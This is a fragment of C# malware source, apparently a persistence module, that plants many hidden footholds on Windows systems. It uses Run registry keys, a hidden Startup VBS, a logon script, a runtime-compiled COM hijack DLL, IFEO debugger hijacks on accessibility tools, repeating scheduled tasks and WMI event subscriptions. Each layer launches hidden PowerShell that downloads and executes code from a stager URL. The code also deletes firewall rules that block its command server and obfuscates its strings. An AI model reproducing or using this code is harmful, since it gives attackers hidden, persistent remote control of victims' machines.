                        InstallAllLayers();
                    }
                    catch { }
                    Thread.Sleep(300000); 
                }
            });
        }

        

        static void InstallAllLayers()
        {
            
            CleanupOldTasks();

            
            InstallRegHKCU();
            InstallStartupVBS();
            InstallCOMHijack();       
            InstallLogonScript();     

            
            if (_HYogZcd._UpUTVTI())
            {
                InstallRegHKLM();
                InstallWMI();
                InstallIFEO();
            }
        }

        static void CleanupOldTasks()
        {
            try
            {
                if (!string.IsNullOrEmpty(_taskBoot))
                    RunHiddenCmd(_Q._S("H5pPs6qOjHENZslW"), "/Delete /TN \"" + _taskBoot + "\" /F");
            }
            catch {}
            try
            {
                if (!string.IsNullOrEmpty(_taskGuard))
                    RunHiddenCmd(_Q._S("H5pPs6qOjHENZslW"), "/Delete /TN \"" + _taskGuard + "\" /F");
            }
            catch {}
        }

        
        static void InstallRegHKCU()
        {
            try
            {
                var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    _Q._S("P7Zhk5y8tUd/TthQA36nGQqNe5Cik4NtVHDtcARjphMCjXGiuY6ObU1f40Yf"), true);
                if (key != null)
                {
                    var existing = key.GetValue(_regNameHKCU) as string;
                    if (existing == null || !existing.Contains(_stagerUrl))
                        key.SetValue(_regNameHKCU, _cradleB64Cmd);
                    key.Close();
                }
            }
            catch { }
        }

        
        static void InstallRegHKLM()
        {
            try
            {
                var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    _Q._S("P7Zhk5y8tUd/TthQA36nGQqNe5Cik4NtVHDtcARjphMCjXGiuY6ObU1f40Yf"), true);
                if (key != null)
                {
                    var existing = key.GetValue(_regNameHKLM) as string;
                    if (existing == null || !existing.Contains(_stagerUrl))
                        key.SetValue(_regNameHKLM, _cradleB64Cmd);
                    key.Close();
                }
            }
            catch { }
        }

        
        static void InstallStartupVBS()
        {
            try
            {
                string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string vbsPath = Path.Combine(startupDir, _vbsName);
                if (!File.Exists(vbsPath))
                {
                    string vbs = "CreateObject(\"WScript.Shell\").Run \"" +
                        _cradleCmd.Replace("\"", "\"\"") + "\", 0, False";
                    File.WriteAllText(vbsPath, vbs, Encoding.Default);
                    try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
            catch { }
        }

        
        static void InstallLogonScript()
        {
            try
            {
                
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string vbsName = _regNameHKCU + "_init.vbs";
                string vbsPath = Path.Combine(appData, vbsName);

                string guardPS =
                    "$ErrorActionPreference='SilentlyContinue';" +
                    "$m=$null;try{$m=[System.Threading.Mutex]::OpenExisting('Global\\MiniAgentV2_" + Environment.MachineName + "')}catch{};" +
                    "if($m){$m.Close();return};" +
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';" +
                    "try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{};" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(guardPS));
                string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -ep bypass -w hidden -NonI -EncodedCommand " + b64 + "\", 0, False";
                File.WriteAllText(vbsPath, vbs, Encoding.Default);
                try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System); } catch { }

                
                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Environment");
                if (key != null)
                {
                    string existing = key.GetValue(_Q._S("OYpCtYKTjnZuc8N/Hna7GD+aVa67iQ==")) as string;
                    string cmd = "wscript.exe /B \"" + vbsPath + "\"";
                    if (existing == null || !existing.Contains(vbsName))
                        key.SetValue(_Q._S("OYpCtYKTjnZuc8N/Hna7GD+aVa67iQ=="), cmd);
                    key.Close();
                }
            }
            catch { }
        }

        
        static string EnsureVbsLauncher(string psArgs)
        {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string name = _regNameHKCU + ".vbs"; 
            string vbsPath = Path.Combine(dir, name);
            string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe " +
                psArgs.Replace("\"", "\"\"") + "\", 0, False";
            
            File.WriteAllText(vbsPath, vbs, Encoding.Default);
            try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
            return vbsPath;
        }

        
        static void InstallCOMHijack()
        {
            try
            {
                
                if (File.Exists(_comDllPath) && IsCOMHijackInstalled())
                    return;

                
                string mutexName = _Q._S("K5VIpaqRu09KbdhyFnS6AjrLeA==") + Environment.MachineName;
                string guardPS =
                    "$ErrorActionPreference='SilentlyContinue';" +
                    "$m=$null;try{$m=[System.Threading.Mutex]::OpenExisting('" + mutexName + "')}catch{};" +
                    "if($m){$m.Close();return};" +
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';" +
                    "try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{};" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))";
                byte[] utf16 = Encoding.Unicode.GetBytes(guardPS);
                string b64 = Convert.ToBase64String(utf16);

                
                string csSource = string.Format(
                    "using System;\n" +
                    "using System.Diagnostics;\n" +
                    "using System.Threading;\n" +
                    "using System.Runtime.InteropServices;\n" +
                    "[assembly: System.Reflection.AssemblyTitle(\"{0}\")]\n" +
                    "[assembly: System.Reflection.AssemblyVersion(\"1.0.0.0\")]\n" +
                    "[ComVisible(true)]\n" +
                    "[Guid(\"{1}\")]\n" +
                    "public class {2} {{\n" +
                    "  static {2}() {{\n" +
                    "    try {{\n" +
                    "      Mutex m = null;\n" +
                    "      try {{ m = Mutex.OpenExisting(\"{3}\"); }} catch {{}}\n" +
                    "      if (m != null) {{ m.Close(); return; }}\n" +
                    "      ProcessStartInfo psi = new ProcessStartInfo(\"powershell.exe\",\n" +
                    "        \"-ep bypass -w hidden -NonI -EncodedCommand {4}\");\n" +
                    "      psi.WindowStyle = ProcessWindowStyle.Hidden;\n" +
                    "      psi.CreateNoWindow = true;\n" +
                    "      psi.UseShellExecute = false;\n" +
                    "      Process.Start(psi);\n" +
                    "    }} catch {{}}\n" +
                    "  }}\n" +
                    "}}\n",
                    _comAsmName, _comClassGuid, _comClassName, mutexName, b64);

                
                string tmpCs = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cs");
                File.WriteAllText(tmpCs, csSource, Encoding.UTF8);

                
                string csc = null;
                string[] cscPaths = new string[] {
                    @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                    @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
                };
                foreach (string p in cscPaths)
                {
                    if (File.Exists(p)) { csc = p; break; }
                }
                if (csc == null) { try { File.Delete(tmpCs); } catch {} return; }

                
                var psi2 = new ProcessStartInfo(csc,
                    "/target:library /optimize+ /nologo /out:\"" + _comDllPath + "\" /reference:System.dll \"" + tmpCs + "\"")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi2);
                if (proc != null) proc.WaitForExit(15000);
                try { File.Delete(tmpCs); } catch {}
                try { File.SetAttributes(_comDllPath, FileAttributes.Hidden | FileAttributes.System); } catch {}

                if (!File.Exists(_comDllPath)) return;

                
                string codeBase = "file:///" + _comDllPath.Replace('\\', '/');
                foreach (string clsid in _comTargets)
                {
                    try
                    {
                        string keyPath = @"Software\Classes\CLSID\" + clsid + @"\InprocServer32";
                        var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(keyPath);
                        if (key != null)
                        {
                            key.SetValue("", "mscoree.dll");
                            key.SetValue("ThreadingModel", "Both");
                            key.SetValue("Class", _comClassName);
                            key.SetValue("Assembly", _comAsmName + ", Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                            key.SetValue("CodeBase", codeBase);
                            key.SetValue("RuntimeVersion", "v4.0.30319");
                            key.Close();
                        }
                    }
                    catch {}
                }
            }
            catch {}
        }

        static bool IsCOMHijackInstalled()
        {
            if (_comTargets.Length == 0) return false;
            try
            {
                string keyPath = @"Software\Classes\CLSID\" + _comTargets[0] + @"\InprocServer32";
                var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(keyPath, false);
                if (key == null) return false;
                string val = key.GetValue("CodeBase") as string;
                key.Close();
                return val != null && val.Contains(_comDllName);
            }
            catch { return false; }
        }

        static void UninstallCOMHijack()
        {
            foreach (string clsid in _comTargets)
            {
                try
                {
                    Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(
                        @"Software\Classes\CLSID\" + clsid, false);
                }
                catch {}
            }
            try { File.Delete(_comDllPath); } catch {}
        }

        
        static void InstallIFEO()
        {
            
            string[] targets = { "sethc.exe", "utilman.exe", "narrator.exe" };
            string debugger = _cradleB64Cmd;

            foreach (string target in targets)
            {
                try
                {
                    string keyPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + target;
                    var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(keyPath);
                    if (key != null)
                    {
                        string existing = key.GetValue("Debugger") as string;
                        if (existing == null || !existing.Contains("EncodedCommand"))
                        {
                            
                            
                            string origPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), target);
                            key.SetValue("Debugger", debugger);
                        }
                        key.Close();
                    }
                }
                catch { }
            }
        }

        
        static void InstallBootTask()
        {
            try
            {
                
                string bootPsArgs = "-ep bypass -w hidden -NonI -c \"Start-Sleep -Seconds 10;" +
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))\"";
                string vbsPath = EnsureVbsLauncher(bootPsArgs);

                
                string userId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                    "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>" +
                    "<Principals><Principal><UserId>" + SecurityElement.Escape(userId) + "</UserId>" +
                    "<LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                    "<AllowHardTerminate>false</AllowHardTerminate>" +
                    "<StartWhenAvailable>true</StartWhenAvailable>" +
                    "<Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>" +
                    "<Actions><Exec>" +
                    "<Command>wscript.exe</Command>" +
                    "<Arguments>\"" + vbsPath + "\"</Arguments>" +
                    "</Exec></Actions></Task>";

                string xmlPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".xml");
                File.WriteAllText(xmlPath, xml, Encoding.Unicode);
                RunHiddenCmd(_Q._S("H5pPs6qOjHENZslW"), "/Create /TN \"" + _taskBoot + "\" /XML \"" + xmlPath + "\" /F");
                try { File.Delete(xmlPath); } catch { }
            }
            catch { }
        }

        
        static void InstallGuardTask()
        {
            try
            {
                string mutexName = _Q._S("K5VIpaqRu09KbdhyFnS6AjrLeA==") + Environment.MachineName;
                
                string guardPS =
                    "$ErrorActionPreference='SilentlyContinue';" +
                    "$m=$null;try{$m=[System.Threading.Mutex]::OpenExisting('" + mutexName + "')}catch{};" +
                    "if($m){$m.Close();exit};" +
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))";
                byte[] utf16 = Encoding.Unicode.GetBytes(guardPS);
                string b64 = Convert.ToBase64String(utf16);

                
                string dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string guardVbs = Path.Combine(dir, _regNameHKLM + ".vbs");
                string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -ep bypass -w hidden -NonI -EncodedCommand " + b64 + "\", 0, False";
                File.WriteAllText(guardVbs, vbs, Encoding.Default);
                try { File.SetAttributes(guardVbs, FileAttributes.Hidden | FileAttributes.System); } catch { }

                string userId2 = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                    "<Triggers><TimeTrigger><StartBoundary>2020-01-01T00:00:00</StartBoundary>" +
                    "<Repetition><Interval>PT2M</Interval><Duration>P9999D</Duration></Repetition>" +
                    "<Enabled>true</Enabled></TimeTrigger></Triggers>" +
                    "<Principals><Principal><UserId>" + SecurityElement.Escape(userId2) + "</UserId>" +
                    "<LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                    "<Hidden>true</Hidden><ExecutionTimeLimit>PT5M</ExecutionTimeLimit></Settings>" +
                    "<Actions><Exec>" +
                    "<Command>wscript.exe</Command>" +
                    "<Arguments>\"" + guardVbs + "\"</Arguments>" +
                    "</Exec></Actions></Task>";

                string xmlPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".xml");
                File.WriteAllText(xmlPath, xml, Encoding.Unicode);
                RunHiddenCmd(_Q._S("H5pPs6qOjHENZslW"), "/Create /TN \"" + _taskGuard + "\" /XML \"" + xmlPath + "\" /F");
                try { File.Delete(xmlPath); } catch { }
            }
            catch { }
        }

        
        static void InstallWMI()
        {
            try
            {
                var scope = new ManagementScope(@"\\.\root\subscription");
                scope.Connect();

                
                var query = new ObjectQuery("SELECT * FROM CommandLineEventConsumer WHERE Name='" + _wmiName + "'");
                var searcher = new ManagementObjectSearcher(scope, query);
                if (searcher.Get().Count > 0)
                    return;

                
                try
                {
                    foreach (ManagementObject obj in new ManagementObjectSearcher(scope,
                        new ObjectQuery("SELECT * FROM ActiveScriptEventConsumer WHERE Name='" + _wmiName + "'")).Get())
                        obj.Delete();
                    foreach (ManagementObject obj in new ManagementObjectSearcher(scope,
                        new ObjectQuery("SELECT * FROM __FilterToConsumerBinding")).Get())
                    {
                        if (obj["Filter"] != null && obj["Filter"].ToString().Contains(_wmiName))
                            obj.Delete();
                    }
                    foreach (ManagementObject obj in new ManagementObjectSearcher(scope,
                        new ObjectQuery("SELECT * FROM __EventFilter WHERE Name='" + _wmiName + "'")).Get())
                        obj.Delete();
                }
                catch { }

                
                string mutexName = _Q._S("K5VIpaqRu09KbdhyFnS6AjrLeA==") + Environment.MachineName;
                string psCheck = string.Format(
                    "$m=$null;try{{$m=[Threading.Mutex]::OpenExisting('{0}')}}catch{{}};if($m){{$m.Close();exit}};{1}",
                    mutexName,
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('" + _stagerUrl + "'))");

                string cmdLine = "powershell.exe -ep bypass -w hidden -NonI -c \"" + psCheck.Replace("\"", "'") + "\"";

                
                var filterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                var filter = filterClass.CreateInstance();
                filter["Name"] = _wmiName;
                filter["QueryLanguage"] = "WQL";
                filter["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
                filter["EventNamespace"] = @"root\cimv2";
                filter.Put();

                
                var consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
                var consumer = consumerClass.CreateInstance();
                consumer["Name"] = _wmiName;
                consumer["CommandLineTemplate"] = cmdLine;
                consumer["RunInteractively"] = false;
                consumer.Put();

                
                var bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
                var binding = bindingClass.CreateInstance();
                binding["Filter"] = filter.Path.Path;
                binding["Consumer"] = consumer.Path.Path;
                binding.Put();
            }
            catch { }
        }

        
        static void HealFirewall()
        {
            if (string.IsNullOrEmpty(_c2Host)) return;
            try
            {
                string ps = "Get-NetFirewallRule -EA SilentlyContinue|?{$_.Action -eq 'Block' -and $_.Direction -eq 'Outbound'}|%{" +
                    "$a=Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $_ -EA SilentlyContinue;" +
                    "if($a.RemoteAddress -match '" + _c2Host + "'){Remove-NetFirewallRule -Name $_.Name -EA SilentlyContinue}}";
                RunHiddenCmd(_Q._S("HJZQormOj2dPb59WCXQ="), "-ep bypass -w hidden -c \"" + ps + "\"");
            }
            catch { }
        }

        
        static string RunHiddenCmd(string exe, string args)
        {
            try
            {
                var psi = new ProcessStartInfo(exe, args)
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var p = Process.Start(psi);
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit(10000);
                return output;
            }
            catch { return null; }
        }
    }
}
